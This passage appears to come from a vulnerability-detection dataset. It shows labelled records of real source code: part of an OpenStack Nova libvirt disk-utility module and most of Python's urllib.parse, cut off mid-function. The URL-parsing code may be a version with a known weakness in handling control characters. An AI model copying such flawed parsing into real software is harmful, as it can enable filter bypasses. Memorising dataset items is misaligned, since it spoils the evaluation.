attempts=3, run_as_root=True)\n\n\ndef pick_disk_driver_name(is_block_dev=False):\n    \"\"\"Pick the libvirt primary backend driver name\n\n    If the hypervisor supports multiple backend drivers, then the name\n    attribute selects the primary backend driver name, while the optional\n    type attribute provides the sub-type.  For example, xen supports a name\n    of \"tap\", \"tap2\", \"phy\", or \"file\", with a type of \"aio\" or \"qcow2\",\n    while qemu only supports a name of \"qemu\", but multiple types including\n    \"raw\", \"bochs\", \"qcow2\", and \"qed\".\n\n    :param is_block_dev:\n    :returns: driver_name or None\n    \"\"\"\n    if FLAGS.libvirt_type == \"xen\":\n        if is_block_dev:\n            return \"phy\"\n        else:\n            return \"tap\"\n    elif FLAGS.libvirt_type in ('kvm', 'qemu'):\n        return \"qemu\"\n    else:\n        # UML doesn't want a driver_name set\n        return None\n\n\ndef get_disk_size(path):\n    \"\"\"Get the (virtual) size of a disk image\n\n    :param path: Path to the disk image\n    :returns: Size (in bytes) of the given disk image as it would be seen\n              by a virtual machine.\n    \"\"\"\n    size = images.qemu_img_info(path)['virtual size']\n    size = size.split('(')[1].split()[0]\n    return int(size)\n\n\ndef get_disk_backing_file(path):\n    \"\"\"Get the backing file of a disk image\n\n    :param path: Path to the disk image\n    :returns: a path to the image's backing store\n    \"\"\"\n    backing_file = images.qemu_img_info(path).get('backing file')\n\n    if backing_file:\n        if 'actual path: ' in backing_file:\n            backing_file = backing_file.split('actual path: ')[1][:-1]\n        backing_file = os.path.basename(backing_file)\n\n    return backing_file\n\n\ndef copy_image(src, dest, host=None):\n    \"\"\"Copy a disk image to an existing directory\n\n    :param src: Source image\n    :param dest: Destination path\n    :param host: Remote host\n    \"\"\"\n\n    if not host:\n        # We shell out to cp because that will intelligently copy\n        # sparse files.  I.E. holes will not be written to DEST,\n        # rather recreated efficiently.  In addition, since\n        # coreutils 8.11, holes can be read efficiently too.\n        execute('cp', src, dest)\n    else:\n        dest = \"%s:%s\" % (host, dest)\n        # Try rsync first as that can compress and create sparse dest files.\n        # Note however that rsync currently doesn't read sparse files\n        # efficiently: https://bugzilla.samba.org/show_bug.cgi?id=8918\n        # At least network traffic is mitigated with compression.\n        try:\n            # Do a relatively light weight test first, so that we\n            # can fall back to scp, without having run out of space\n            # on the destination for example.\n            execute('rsync', '--sparse', '--compress', '--dry-run', src, dest)\n        except exception.ProcessExecutionError:\n            execute('scp', src, dest)\n        else:\n            execute('rsync', '--sparse', '--compress', src, dest)\n\n\ndef mkfs(fs, path, label=None):\n    \"\"\"Format a file or block device\n\n    :param fs: Filesystem type (examples include 'swap', 'ext3', 'ext4'\n               'btrfs', etc.)\n    :param path: Path to file or block device to format\n    :param label: Volume label to use\n    \"\"\"\n    if fs == 'swap':\n        execute('mkswap', path)\n    else:\n        args = ['mkfs', '-t', fs]\n        #add -F to force no interactive excute on non-block device.\n        if fs in ['ext3', 'ext4']:\n            args.extend(['-F'])\n        if label:\n            args.extend(['-n', label])\n        args.append(path)\n        execute(*args)\n\n\ndef write_to_file(path, contents, umask=None):\n    \"\"\"Write the given contents to a file\n\n    :param path: Destination file\n    :param contents: Desired contents of the file\n    :param umask: Umask to set when creating this file (will be reset)\n    \"\"\"\n    if umask:\n        saved_umask = os.umask(umask)\n\n    try:\n        with open(path, 'w') as f:\n            f.write(contents)\n    finally:\n        if umask:\n            os.umask(saved_umask)\n\n\ndef chown(path, owner):\n    \"\"\"Change ownership of file or directory\n\n    :param path: File or directory whose ownership to change\n    :param owner: Desired new owner (given as uid or username)\n    \"\"\"\n    execute('chown', owner, path, run_as_root=True)\n\n\ndef create_snapshot(disk_path, snapshot_name):\n    \"\"\"Create a snapshot in a disk image\n\n    :param disk_path: Path to disk image\n    :param snapshot_name: Name of snapshot in disk image\n    \"\"\"\n    qemu_img_cmd = ('qemu-img',\n                    'snapshot',\n                    '-c',\n                    snapshot_name,\n                    disk_path)\n    # NOTE(vish): libvirt changes ownership of images\n    execute(*qemu_img_cmd, run_as_root=True)\n\n\ndef delete_snapshot(disk_path, snapshot_name):\n    \"\"\"Create a snapshot in a disk image\n\n    :param disk_path: Path to disk image\n    :param snapshot_name: Name of snapshot in disk image\n    \"\"\"\n    qemu_img_cmd = ('qemu-img',\n                    'snapshot',\n                    '-d',\n                    snapshot_name,\n                    disk_path)\n    # NOTE(vish): libvirt changes ownership of images\n    execute(*qemu_img_cmd, run_as_root=True)\n\n\ndef extract_snapshot(disk_path, source_fmt, snapshot_name, out_path, dest_fmt):\n    \"\"\"Extract a named snapshot from a disk image\n\n    :param disk_path: Path to disk image\n    :param snapshot_name: Name of snapshot in disk image\n    :param out_path: Desired path of extracted snapshot\n    \"\"\"\n    # NOTE(markmc): ISO is just raw to qemu-img\n    if dest_fmt == 'iso':\n        dest_fmt = 'raw'\n    qemu_img_cmd = ('qemu-img',\n                    'convert',\n                    '-f',\n                    source_fmt,\n                    '-O',\n                    dest_fmt,\n                    '-s',\n                    snapshot_name,\n                    disk_path,\n                    out_path)\n    execute(*qemu_img_cmd)\n\n\ndef load_file(path):\n    \"\"\"Read contents of file\n\n    :param path: File to read\n    \"\"\"\n    with open(path, 'r') as fp:\n        return fp.read()\n\n\ndef file_open(*args, **kwargs):\n    \"\"\"Open file\n\n    see built-in file() documentation for more details\n\n    Note: The reason this is kept in a separate module is to easily\n          be able to provide a stub module that doesn't alter system\n          state at all (for unit tests)\n    \"\"\"\n    return file(*args, **kwargs)\n\n\ndef file_delete(path):\n    \"\"\"Delete (unlink) file\n\n    Note: The reason this is kept in a separate module is to easily\n          be able to provide a stub module that doesn't alter system\n          state at all (for unit tests)\n    \"\"\"\n    return os.unlink(path)\n\n\ndef get_fs_info(path):\n    \"\"\"Get free/used/total space info for a filesystem\n\n    :param path: Any dirent on the filesystem\n    :returns: A dict containing:\n\n             :free: How much space is free (in bytes)\n             :used: How much space is used (in bytes)\n             :total: How big the filesystem is (in bytes)\n    \"\"\"\n    hddinfo = os.statvfs(path)\n    total = hddinfo.f_frsize * hddinfo.f_blocks\n    free = hddinfo.f_frsize * hddinfo.f_bavail\n    used = hddinfo.f_frsize * (hddinfo.f_blocks - hddinfo.f_bfree)\n    return {'total': total,\n            'free': free,\n            'used': used}\n\n\ndef fetch_image(context, target, image_id, user_id, project_id):\n    \"\"\"Grab image\"\"\"\n    images.fetch_to_raw(context, image_id, target, user_id, project_id)\n\n\ndef get_info_filename(base_path):\n    \"\"\"Construct a filename for storing addtional information about a base\n    image.\n\n    Returns a filename.\n    \"\"\"\n\n    base_file = os.path.basename(base_path)\n    return (FLAGS.image_info_filename_pattern\n            % {'image': base_file})\n\n\ndef is_valid_info_file(path):\n    \"\"\"Test if a given path matches the pattern for info files.\"\"\"\n\n    digest_size = hashlib.sha1().digestsize * 2\n    regexp = (FLAGS.image_info_filename_pattern\n              % {'image': ('([0-9a-f]{%(digest_size)d}|'\n                           '[0-9a-f]{%(digest_size)d}_sm|'\n                           '[0-9a-f]{%(digest_size)d}_[0-9]+)'\n                           % {'digest_size': digest_size})})\n    m = re.match(regexp, path)\n    if m:\n        return True\n    return False\n\n\ndef read_stored_info(base_path, field=None):\n    \"\"\"Read information about an image.\n\n    Returns an empty dictionary if there is no info, just the field value if\n    a field is requested, or the entire dictionary otherwise.\n    \"\"\"\n\n    info_file = get_info_filename(base_path)\n    if not os.path.exists(info_file):\n        # Special case to handle essex checksums being converted\n        old_filename = base_path + '.sha1'\n        if field == 'sha1' and os.path.exists(old_filename):\n            hash_file = open(old_filename)\n            hash_value = hash_file.read()\n            hash_file.close()\n\n            write_stored_info(base_path, field=field, value=hash_value)\n            os.remove(old_filename)\n            d = {field: hash_value}\n\n        else:\n            d = {}\n\n    else:\n        LOG.info(_('Reading image info file: %s'), info_file)\n        f = open(info_file, 'r')\n        serialized = f.read().rstrip()\n        f.close()\n        LOG.info(_('Read: %s'), serialized)\n\n        try:\n            d = jsonutils.loads(serialized)\n\n        except ValueError, e:\n            LOG.error(_('Error reading image info file %(filename)s: '\n                        '%(error)s'),\n                      {'filename': info_file,\n                       'error': e})\n            d = {}\n\n    if field:\n        return d.get(field, None)\n    return d\n\n\ndef write_stored_info(target, field=None, value=None):\n    \"\"\"Write information about an image.\"\"\"\n\n    if not field:\n        return\n\n    info_file = get_info_filename(target)\n    utils.ensure_tree(os.path.dirname(info_file))\n\n    d = read_stored_info(info_file)\n    d[field] = value\n    serialized = jsonutils.dumps(d)\n\n    LOG.info(_('Writing image info file: %s'), info_file)\n    LOG.info(_('Wrote: %s'), serialized)\n    f = open(info_file, 'w')\n    f.write(serialized)\n    f.close()\n", "target": 0}
{"idx": 1048, "func": "\"\"\"Parse (absolute and relative) URLs.\n\nurlparse module is based upon the following RFC specifications.\n\nRFC 3986 (STD66): \"Uniform Resource Identifiers\" by T. Berners-Lee, R. Fielding\nand L.  Masinter, January 2005.\n\nRFC 2732 : \"Format for Literal IPv6 Addresses in URL's by R.Hinden, B.Carpenter\nand L.Masinter, December 1999.\n\nRFC 2396:  \"Uniform Resource Identifiers (URI)\": Generic Syntax by T.\nBerners-Lee, R. Fielding, and L. Masinter, August 1998.\n\nRFC 2368: \"The mailto URL scheme\", by P.Hoffman , L Masinter, J. Zawinski, July 1998.\n\nRFC 1808: \"Relative Uniform Resource Locators\", by R. Fielding, UC Irvine, June\n1995.\n\nRFC 1738: \"Uniform Resource Locators (URL)\" by T. Berners-Lee, L. Masinter, M.\nMcCahill, December 1994\n\nRFC 3986 is considered the current standard and any future changes to\nurlparse module should conform with it.  The urlparse module is\ncurrently not entirely compliant with this RFC due to defacto\nscenarios for parsing, and for backward compatibility purposes, some\nparsing quirks from older RFCs are retained. The testcases in\ntest_urlparse.py provides a good indicator of parsing behavior.\n\"\"\"\n\nimport re\nimport sys\nimport collections\nimport warnings\n\n__all__ = [\"urlparse\", \"urlunparse\", \"urljoin\", \"urldefrag\",\n           \"urlsplit\", \"urlunsplit\", \"urlencode\", \"parse_qs\",\n           \"parse_qsl\", \"quote\", \"quote_plus\", \"quote_from_bytes\",\n           \"unquote\", \"unquote_plus\", \"unquote_to_bytes\",\n           \"DefragResult\", \"ParseResult\", \"SplitResult\",\n           \"DefragResultBytes\", \"ParseResultBytes\", \"SplitResultBytes\"]\n\n# A classification of schemes.\n# The empty string classifies URLs with no scheme specified,\n# being the default value returned by \u201curlsplit\u201d and \u201curlparse\u201d.\n\nuses_relative = ['', 'ftp', 'http', 'gopher', 'nntp', 'imap',\n                 'wais', 'file', 'https', 'shttp', 'mms',\n                 'prospero', 'rtsp', 'rtspu', 'sftp',\n                 'svn', 'svn+ssh', 'ws', 'wss']\n\nuses_netloc = ['', 'ftp', 'http', 'gopher', 'nntp', 'telnet',\n               'imap', 'wais', 'file', 'mms', 'https', 'shttp',\n               'snews', 'prospero', 'rtsp', 'rtspu', 'rsync',\n               'svn', 'svn+ssh', 'sftp', 'nfs', 'git', 'git+ssh',\n               'ws', 'wss']\n\nuses_params = ['', 'ftp', 'hdl', 'prospero', 'http', 'imap',\n               'https', 'shttp', 'rtsp', 'rtspu', 'sip', 'sips',\n               'mms', 'sftp', 'tel']\n\n# These are not actually used anymore, but should stay for backwards\n# compatibility.  (They are undocumented, but have a public-looking name.)\n\nnon_hierarchical = ['gopher', 'hdl', 'mailto', 'news',\n                    'telnet', 'wais', 'imap', 'snews', 'sip', 'sips']\n\nuses_query = ['', 'http', 'wais', 'imap', 'https', 'shttp', 'mms',\n              'gopher', 'rtsp', 'rtspu', 'sip', 'sips']\n\nuses_fragment = ['', 'ftp', 'hdl', 'http', 'gopher', 'news',\n                 'nntp', 'wais', 'https', 'shttp', 'snews',\n                 'file', 'prospero']\n\n# Characters valid in scheme names\nscheme_chars = ('abcdefghijklmnopqrstuvwxyz'\n                'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n                '0123456789'\n                '+-.')\n\n# XXX: Consider replacing with functools.lru_cache\nMAX_CACHE_SIZE = 20\n_parse_cache = {}\n\ndef clear_cache():\n    \"\"\"Clear the parse cache and the quoters cache.\"\"\"\n    _parse_cache.clear()\n    _safe_quoters.clear()\n\n\n# Helpers for bytes handling\n# For 3.2, we deliberately require applications that\n# handle improperly quoted URLs to do their own\n# decoding and encoding. If valid use cases are\n# presented, we may relax this by using latin-1\n# decoding internally for 3.3\n_implicit_encoding = 'ascii'\n_implicit_errors = 'strict'\n\ndef _noop(obj):\n    return obj\n\ndef _encode_result(obj, encoding=_implicit_encoding,\n                        errors=_implicit_errors):\n    return obj.encode(encoding, errors)\n\ndef _decode_args(args, encoding=_implicit_encoding,\n                       errors=_implicit_errors):\n    return tuple(x.decode(encoding, errors) if x else '' for x in args)\n\ndef _coerce_args(*args):\n    # Invokes decode if necessary to create str args\n    # and returns the coerced inputs along with\n    # an appropriate result coercion function\n    #   - noop for str inputs\n    #   - encoding function otherwise\n    str_input = isinstance(args[0], str)\n    for arg in args[1:]:\n        # We special-case the empty string to support the\n        # \"scheme=''\" default argument to some functions\n        if arg and isinstance(arg, str) != str_input:\n            raise TypeError(\"Cannot mix str and non-str arguments\")\n    if str_input:\n        return args + (_noop,)\n    return _decode_args(args) + (_encode_result,)\n\n# Result objects are more helpful than simple tuples\nclass _ResultMixinStr(object):\n    \"\"\"Standard approach to encoding parsed results from str to bytes\"\"\"\n    __slots__ = ()\n\n    def encode(self, encoding='ascii', errors='strict'):\n        return self._encoded_counterpart(*(x.encode(encoding, errors) for x in self))\n\n\nclass _ResultMixinBytes(object):\n    \"\"\"Standard approach to decoding parsed results from bytes to str\"\"\"\n    __slots__ = ()\n\n    def decode(self, encoding='ascii', errors='strict'):\n        return self._decoded_counterpart(*(x.decode(encoding, errors) for x in self))\n\n\nclass _NetlocResultMixinBase(object):\n    \"\"\"Shared methods for the parsed result objects containing a netloc element\"\"\"\n    __slots__ = ()\n\n    @property\n    def username(self):\n        return self._userinfo[0]\n\n    @property\n    def password(self):\n        return self._userinfo[1]\n\n    @property\n    def hostname(self):\n        hostname = self._hostinfo[0]\n        if not hostname:\n            return None\n        # Scoped IPv6 address may have zone info, which must not be lowercased\n        # like http://[fe80::822a:a8ff:fe49:470c%tESt]:1234/keys\n        separator = '%' if isinstance(hostname, str) else b'%'\n        hostname, percent, zone = hostname.partition(separator)\n        return hostname.lower() + percent + zone\n\n    @property\n    def port(self):\n        port = self._hostinfo[1]\n        if port is not None:\n            try:\n                port = int(port, 10)\n            except ValueError:\n                message = f'Port could not be cast to integer value as {port!r}'\n                raise ValueError(message) from None\n            if not ( 0 <= port <= 65535):\n                raise ValueError(\"Port out of range 0-65535\")\n        return port\n\n\nclass _NetlocResultMixinStr(_NetlocResultMixinBase, _ResultMixinStr):\n    __slots__ = ()\n\n    @property\n    def _userinfo(self):\n        netloc = self.netloc\n        userinfo, have_info, hostinfo = netloc.rpartition('@')\n        if have_info:\n            username, have_password, password = userinfo.partition(':')\n            if not have_password:\n                password = None\n        else:\n            username = password = None\n        return username, password\n\n    @property\n    def _hostinfo(self):\n        netloc = self.netloc\n        _, _, hostinfo = netloc.rpartition('@')\n        _, have_open_br, bracketed = hostinfo.partition('[')\n        if have_open_br:\n            hostname, _, port = bracketed.partition(']')\n            _, _, port = port.partition(':')\n        else:\n            hostname, _, port = hostinfo.partition(':')\n        if not port:\n            port = None\n        return hostname, port\n\n\nclass _NetlocResultMixinBytes(_NetlocResultMixinBase, _ResultMixinBytes):\n    __slots__ = ()\n\n    @property\n    def _userinfo(self):\n        netloc = self.netloc\n        userinfo, have_info, hostinfo = netloc.rpartition(b'@')\n        if have_info:\n            username, have_password, password = userinfo.partition(b':')\n            if not have_password:\n                password = None\n        else:\n            username = password = None\n        return username, password\n\n    @property\n    def _hostinfo(self):\n        netloc = self.netloc\n        _, _, hostinfo = netloc.rpartition(b'@')\n        _, have_open_br, bracketed = hostinfo.partition(b'[')\n        if have_open_br:\n            hostname, _, port = bracketed.partition(b']')\n            _, _, port = port.partition(b':')\n        else:\n            hostname, _, port = hostinfo.partition(b':')\n        if not port:\n            port = None\n        return hostname, port\n\n\nfrom collections import namedtuple\n\n_DefragResultBase = namedtuple('DefragResult', 'url fragment')\n_SplitResultBase = namedtuple(\n    'SplitResult', 'scheme netloc path query fragment')\n_ParseResultBase = namedtuple(\n    'ParseResult', 'scheme netloc path params query fragment')\n\n_DefragResultBase.__doc__ = \"\"\"\nDefragResult(url, fragment)\n\nA 2-tuple that contains the url without fragment identifier and the fragment\nidentifier as a separate argument.\n\"\"\"\n\n_DefragResultBase.url.__doc__ = \"\"\"The URL with no fragment identifier.\"\"\"\n\n_DefragResultBase.fragment.__doc__ = \"\"\"\nFragment identifier separated from URL, that allows indirect identification of a\nsecondary resource by reference to a primary resource and additional identifying\ninformation.\n\"\"\"\n\n_SplitResultBase.__doc__ = \"\"\"\nSplitResult(scheme, netloc, path, query, fragment)\n\nA 5-tuple that contains the different components of a URL. Similar to\nParseResult, but does not split params.\n\"\"\"\n\n_SplitResultBase.scheme.__doc__ = \"\"\"Specifies URL scheme for the request.\"\"\"\n\n_SplitResultBase.netloc.__doc__ = \"\"\"\nNetwork location where the request is made to.\n\"\"\"\n\n_SplitResultBase.path.__doc__ = \"\"\"\nThe hierarchical path, such as the path to a file to download.\n\"\"\"\n\n_SplitResultBase.query.__doc__ = \"\"\"\nThe query component, that contains non-hierarchical data, that along with data\nin path component, identifies a resource in the scope of URI's scheme and\nnetwork location.\n\"\"\"\n\n_SplitResultBase.fragment.__doc__ = \"\"\"\nFragment identifier, that allows indirect identification of a secondary resource\nby reference to a primary resource and additional identifying information.\n\"\"\"\n\n_ParseResultBase.__doc__ = \"\"\"\nParseResult(scheme, netloc, path, params, query, fragment)\n\nA 6-tuple that contains components of a parsed URL.\n\"\"\"\n\n_ParseResultBase.scheme.__doc__ = _SplitResultBase.scheme.__doc__\n_ParseResultBase.netloc.__doc__ = _SplitResultBase.netloc.__doc__\n_ParseResultBase.path.__doc__ = _SplitResultBase.path.__doc__\n_ParseResultBase.params.__doc__ = \"\"\"\nParameters for last path element used to dereference the URI in order to provide\naccess to perform some operation on the resource.\n\"\"\"\n\n_ParseResultBase.query.__doc__ = _SplitResultBase.query.__doc__\n_ParseResultBase.fragment.__doc__ = _SplitResultBase.fragment.__doc__\n\n\n# For backwards compatibility, alias _NetlocResultMixinStr\n# ResultBase is no longer part of the documented API, but it is\n# retained since deprecating it isn't worth the hassle\nResultBase = _NetlocResultMixinStr\n\n# Structured result objects for string data\nclass DefragResult(_DefragResultBase, _ResultMixinStr):\n    __slots__ = ()\n    def geturl(self):\n        if self.fragment:\n            return self.url + '#' + self.fragment\n        else:\n            return self.url\n\nclass SplitResult(_SplitResultBase, _NetlocResultMixinStr):\n    __slots__ = ()\n    def geturl(self):\n        return urlunsplit(self)\n\nclass ParseResult(_ParseResultBase, _NetlocResultMixinStr):\n    __slots__ = ()\n    def geturl(self):\n        return urlunparse(self)\n\n# Structured result objects for bytes data\nclass DefragResultBytes(_DefragResultBase, _ResultMixinBytes):\n    __slots__ = ()\n    def geturl(self):\n        if self.fragment:\n            return self.url + b'#' + self.fragment\n        else:\n            return self.url\n\nclass SplitResultBytes(_SplitResultBase, _NetlocResultMixinBytes):\n    __slots__ = ()\n    def geturl(self):\n        return urlunsplit(self)\n\nclass ParseResultBytes(_ParseResultBase, _NetlocResultMixinBytes):\n    __slots__ = ()\n    def geturl(self):\n        return urlunparse(self)\n\n# Set up the encode/decode result pairs\ndef _fix_result_transcoding():\n    _result_pairs = (\n        (DefragResult, DefragResultBytes),\n        (SplitResult, SplitResultBytes),\n        (ParseResult, ParseResultBytes),\n    )\n    for _decoded, _encoded in _result_pairs:\n        _decoded._encoded_counterpart = _encoded\n        _encoded._decoded_counterpart = _decoded\n\n_fix_result_transcoding()\ndel _fix_result_transcoding\n\ndef urlparse(url, scheme='', allow_fragments=True):\n    \"\"\"Parse a URL into 6 components:\n    <scheme>://<netloc>/<path>;<params>?<query>#<fragment>\n    Return a 6-tuple: (scheme, netloc, path, params, query, fragment).\n    Note that we don't break the components up in smaller bits\n    (e.g. netloc is a single string) and we don't expand % escapes.\"\"\"\n    url, scheme, _coerce_result = _coerce_args(url, scheme)\n    splitresult = urlsplit(url, scheme, allow_fragments)\n    scheme, netloc, url, query, fragment = splitresult\n    if scheme in uses_params and ';' in url:\n        url, params = _splitparams(url)\n    else:\n        params = ''\n    result = ParseResult(scheme, netloc, url, params, query, fragment)\n    return _coerce_result(result)\n\ndef _splitparams(url):\n    if '/'  in url:\n        i = url.find(';', url.rfind('/'))\n        if i < 0:\n            return url, ''\n    else:\n        i = url.find(';')\n    return url[:i], url[i+1:]\n\ndef _splitnetloc(url, start=0):\n    delim = len(url)   # position of end of domain part of url, default is end\n    for c in '/?#':    # look for delimiters; the order is NOT important\n        wdelim = url.find(c, start)        # find first of this delim\n        if wdelim >= 0:                    # if found\n            delim = min(delim, wdelim)     # use earliest delim position\n    return url[start:delim], url[delim:]   # return (domain, rest)\n\ndef _checknetloc(netloc):\n    if not netloc or netloc.isascii():\n        return\n    # looking for characters like \\u2100 that expand to 'a/c'\n    # IDNA uses NFKC equivalence, so normalize for this check\n    import unicodedata\n    n = netloc.rpartition('@')[2] # ignore anything to the left of '@'\n    n = n.replace(':', '')        # ignore characters already included\n    n = n.replace('#', '')        # but not the surrounding text\n    n = n.replace('?', '')\n    netloc2 = unicodedata.normalize('NFKC', n)\n    if n == netloc2:\n        return\n    for c in '/?#@:':\n        if c in netloc2:\n            raise ValueError(\"netloc '\" + netloc + \"' contains invalid \" +\n                             \"characters under NFKC normalization\")\n\ndef urlsplit(url, scheme='', allow_fragments=True):\n    \"\"\"Parse a URL into 5 components:\n    <scheme>://<netloc>/<path>?<query>#<fragment>\n    Return a 5-tuple: (scheme, netloc, path, query, fragment).\n    Note that we don't break the components up in smaller bits\n    (e.g. netloc is a single string) and we don't expand % escapes.\"\"\"\n    url, scheme, _coerce_result = _coerce_args(url, scheme)\n    allow_fragments = bool(allow_fragments)\n    key = url, scheme, allow_fragments, type(url), type(scheme)\n    cached = _parse_cache.get(key, None)\n    if cached:\n        return _coerce_result(cached)\n    if len(_parse_cache) >= MAX_CACHE_SIZE: # avoid runaway growth\n        clear_cache()\n    netloc = query = fragment = ''\n    i = url.find(':')\n    if i > 0:\n        if url[:i] == 'http': # optimize the common case\n            url = url[i+1:]\n            if url[:2] == '//':\n                netloc, url = _splitnetloc(url, 2)\n                if (('[' in netloc and ']' not in netloc) or\n                        (']' in netloc and '[' not in netloc)):\n                    raise ValueError(\"Invalid IPv6 URL\")\n            if allow_fragments and '#' in url:\n                url, fragment = url.split('#', 1)\n            if '?' in url:\n                url, query = url.split('?', 1)\n            _checknetloc(netloc)\n            v = SplitResult('http', netloc, url, query, fragment)\n            _parse_cache[key] = v\n            return _coerce_result(v)\n        for c in url[:i]:\n            if c not in scheme_chars:\n                break\n        else:\n            # make sure \"url\" is not actually a port number (in which case\n            # \"scheme\" is really part of the path)\n            rest = url[i+1:]\n            if not rest or any(c not in '0123456789' for c in rest):\n                # not a port number\n                scheme, url = url[:i].lower(), rest\n\n    if url[:2] == '//':\n        netloc, url = _splitnetloc(url, 2)\n        if (('[' in netloc and ']' not in netloc) or\n                (']' in netloc and '[' not in netloc)):\n            raise ValueError(\"Invalid IPv6 URL\")\n    if allow_fragments and '#' in url:\n        url, fragment = url.split('#', 1)\n    if '?' in url:\n        url, query = url.split('?', 1)\n    _checknetloc(netloc)\n    v = SplitResult(scheme, netloc, url, query, fragment)\n    _parse_cache[key] = v\n    return _coerce_result(v)\n\ndef urlunparse(components):\n    \"\"\"Put a parsed URL back together again.  This may result in a\n    slightly different, but equivalent URL, if the URL that was parsed\n    originally had redundant delimiters, e.g. a ? with an empty query\n    (the draft states that these are equivalent).\"\"\"\n    scheme, netloc, url, params, query, fragment, _coerce_result = (\n                                                  _coerce_args(*components))\n    if params:\n        url = \"%s;%s\" % (url, params)\n    return _coerce_result(urlunsplit((scheme, netloc, url, query, fragment)))\n\ndef urlunsplit(components):\n    \"\"\"Combine the elements of a tuple as returned by urlsplit() into a\n    complete URL as a string. The data argument can be any five-item iterable.\n    This may result in a slightly different, but equivalent URL, if the URL that\n    was parsed originally had unnecessary delimiters (for example, a ? with an\n    empty query; the RFC states that these are equivalent).\"\"\"\n    scheme, netloc, url, query, fragment, _coerce_result = (\n                                          _coerce_args(*components))\n    if netloc or (scheme and scheme in uses_netloc and url[:2] != '//'):\n        if url and url[:1] != '/': url = '/' + url\n        url = '//' + (netloc or '') + url\n    if scheme:\n        url = scheme + ':' + url\n    if query:\n        url = url + '?' + query\n    if fragment:\n        url = url + '#' + fragment\n    return _coerce_result(url)\n\ndef urljoin(base, url, allow_fragments=True):\n    \"\"\"Join a base URL and a possibly relative URL to form an absolute\n    interpretation of the latter.\"\"\"\n    if not base:\n        return url\n    if not url:\n        return base\n\n    base, url, _coerce_result = _coerce_args(base, url)\n    bscheme, bnetloc, bpath, bparams, bquery, bfragment = \\\n            urlparse(base, '', allow_fragments)\n    scheme, netloc, path, params, query, fragment = \\\n            urlparse(url, bscheme, allow_fragments)\n\n    if scheme != bscheme or scheme not in uses_relative:\n        return _coerce_result(url)\n    if scheme in uses_netloc:\n        if netloc:\n            return _coerce_result(urlunparse((scheme, netloc, path,\n                                              params, query, fragment)))\n        netloc = bnetloc\n\n    if not path and not params:\n        path = bpath\n        params = bparams\n        if not query:\n            query = bquery\n        return _coerce_result(urlunparse((scheme, netloc, path,\n                                          params, query, fragment)))\n\n    base_parts = bpath.split('/')\n    if base_parts[-1] != '':\n        # the last item is not a directory, so will not be taken into account\n        # in resolving the relative path\n        del base_parts[-1]\n\n    # for rfc3986, ignore all base path should the first character be root.\n    if path[:1] == '/':\n        segments = path.split('/')\n    else:\n        segments = base_parts + path.split('/')\n        # filter out elements that would cause redundant slashes on re-joining\n        # the resolved_path\n        segments[1:-1] = filter(None, segments[1:-1])\n\n    resolved_path = []\n\n    for seg in segments:\n        if seg == '..':\n            try:\n                resolved_path.pop()\n            except IndexError:\n                # ignore any .. segments that would otherwise cause an IndexError\n                # when popped from resolved_path if resolving for rfc3986\n                pass\n        elif seg == '.':\n            continue\n        else:\n            resolved_path.append(seg)\n\n    if segments[-1] in ('.', '..'):\n        # do some post-processing here. if the last segment was a relative dir,\n        # then we need to append the trailing '/'\n        resolved_path.append('')\n\n    return _coerce_result(urlunparse((scheme, netloc, '/'.join(\n        resolved_path) or '/', params, query, fragment)))\n\n\ndef urldefrag(url):\n    \"\"\"Removes any existing fragment from URL.\n\n    Returns a tuple of the defragmented URL and the fragment.  If\n    the URL contained no fragments, the second element is the\n    empty string.\n    \"\"\"\n    url, _coerce_result = _coerce_args(url)\n    if '#' in url:\n        s, n, p, a, q, frag = urlparse(url)\n        defrag = urlunparse((s, n, p, a, q, ''))\n    else:\n        frag = ''\n        defrag = url\n    return _coerce_result(DefragResult(defrag, frag))\n\n_hexdig = '0123456789ABCDEFabcdef'\n_hextobyte = None\n\ndef unquote_to_bytes(string):\n    \"\"\"unquote_to_bytes('abc%20def') -> b'abc def'.\"\"\"\n    # Note: strings are encoded as UTF-8. This is only an issue if it contains\n    # unescaped non-ASCII characters, which URIs should not.\n    if not string:\n        # Is it a string-like object?\n        string.split\n        return b''\n    if isinstance(string, str):\n        string = string.encode('utf-8')\n    bits = string.split(b'%')\n    if len(bits) == 1:\n        return string\n    res = [bits[0]]\n    append = res.append\n    # Delay the initialization of the table to not waste memory\n    # if the function is never called\n    global _hextobyte\n    if _hextobyte is None:\n        _hextobyte = {(a + b).encode(): bytes.fromhex(a + b)\n                      for a in _hexdig for b in _hexdig}\n    for item in bits[1:]:\n        try:\n            append(_hextobyte[item[:2]])\n            append(item[2:])\n        except KeyError:\n            append(b'%')\n            append(item)\n    return b''.join(res)\n\n_asciire = re.compile('([\\x00-\\x7f]+)')\n\ndef unquote(string, encoding='utf-8', errors='replace'):\n    \"\"\"Replace %xx escapes by their single-character equivalent. The optional\n    encoding and errors parameters specify how to decode percent-encoded\n    sequences into Unicode characters, as accepted by the bytes.decode()\n    method.\n    By default, percent-encoded sequences are decoded with UTF-8, and invalid\n    sequences are replaced by a placeholder character.\n\n    unquote('abc%20def') -> 'abc def'.\n    \"\"\"\n    if '%' not in string:\n        string.split\n        return string\n    if encoding is None:\n        encoding = 'utf-8'\n    if errors is None:\n        errors = 'replace'\n    bits = _asciire.split(string)\n    res = [bits[0]]\n    append = res.append\n    for i in range(1, len(bits), 2):\n        append(unquote_to_bytes(bits[i]).decode(encoding, errors))\n        append(bits[i + 1])\n    return ''.join(res)\n\n\ndef parse_qs(qs, keep_blank_values=False, strict_parsing=False,\n             encoding='utf-8', errors='replace', max_num_fields=None):\n    \"\"\"Parse a query given as a string argument.\n\n        Arguments:\n\n        qs: percent-encoded query string to be parsed\n\n        keep_blank_values: flag indicating whether blank values in\n            percent-encoded queries should be treated as blank strings.\n            A true value indicates that blanks should be retained as\n            blank strings.  The default false value indicates that\n            blank values are to be ignored and treated as if they were\n            not included.\n\n        strict_parsing: flag indicating what to do with parsing errors.\n            If false (the default), errors are silently ignored.\n            If true, errors raise a ValueError exception.\n\n        encoding and errors: specify how to decode percent-encoded sequences\n            into Unicode characters, as accepted by the bytes.decode() method.\n\n        max_num_fields: int. If set, then throws a ValueError if there\n            are more than n fields read by parse_qsl().\n\n        Returns a dictionary.\n    \"\"\"\n    parsed_result = {}\n    pairs = parse_qsl(qs, keep_blank_values, strict_parsing,\n                      encoding=encoding, errors=errors,\n                      max_num_fields=max_num_fields)\n    for name, value in pairs:\n        if name in parsed_result:\n            parsed_result[name].append(value)\n        else:\n            parsed_result[name] = [value]\n    return parsed_result\n\n\ndef parse_qsl(qs, keep_blank_values=False, strict_parsing=False,\n              encoding='utf-8', 